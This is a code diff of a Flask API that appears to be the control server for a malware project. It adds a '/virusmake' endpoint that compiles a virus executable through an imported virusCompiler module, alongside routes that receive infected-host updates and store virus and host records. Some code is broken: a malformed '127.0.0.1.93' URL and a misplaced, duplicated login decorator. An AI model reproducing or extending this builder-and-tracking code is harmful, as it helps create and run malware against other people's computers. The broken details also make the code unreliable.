@@ -17,6 +17,12 @@ import traceback
 import base64
 from cryptography.hazmat.primitives.serialization import Encoding
 from Crypto.PublicKey import RSA
+# Import viris compiler script
+import virusCompiler as virus
+
+
+
+
 
 
 api = Blueprint('api', __name__)
@@ -42,10 +48,7 @@ def checkKeyMatch(privateKey):
     keyCheck = crypto.checkKeysFromBytes(privateKey, publicKey)
     print(keyCheck)
 
-## Saves public key to user in sqlite db from ID
-@api.route('/update', methods=['POST', 'GET'])
-def update():
-    print("Virus update called")
+
     
 
 ## Saves public key to user in sqlite db from ID
@@ -140,13 +143,26 @@ def make_response(message, status_code=200):
 #######################
 
 
-###### Virus calls ########
+###### Virus calls #######
 @api.route('/update', methods=['POST'])
 def update():
     print("Virus update called!")
     data = json.loads(request.data)
     print(data)
 
+###### Create virus ######
+@login_required
+@login_required
+@api.route('/virusmake', methods=['GET', 'POST'])
+def virusmake():
+    virus.test()
+    try:
+        virus.generateExe("generated_script.py")
+        return jsonify({'message': 'success'})  # Return a valid response
+    except Exception as e:
+        print(e)
+        return jsonify({'message': str(e)})  # Return a valid response with the error message
+   
 
 
 
@@ -416,7 +432,7 @@ exampleDeleteVirus= {
 @api.route('/apivirussendexample', methods=['GET', 'POST'])
 def apiVirusExample():
     try:
-        url = "http://207.127.88.215:5000/savevirus"
+        url = "http://127.0.0.1:5000/savevirus"
         headers = {'Content-Type': 'application/json'}
         response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
         return "Success"
@@ -427,7 +443,7 @@ def apiVirusExample():
 @api.route('/apihostssendexample', methods=['GET', 'POST'])
 def apiHostsExample():
     try:
-        url = "http://207.127.88.215:5000/savehost"
+        url = "http://127.0.0.1.93:5000/savehost"
         headers = {'Content-Type': 'application/json'}
         response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
         return "Success"
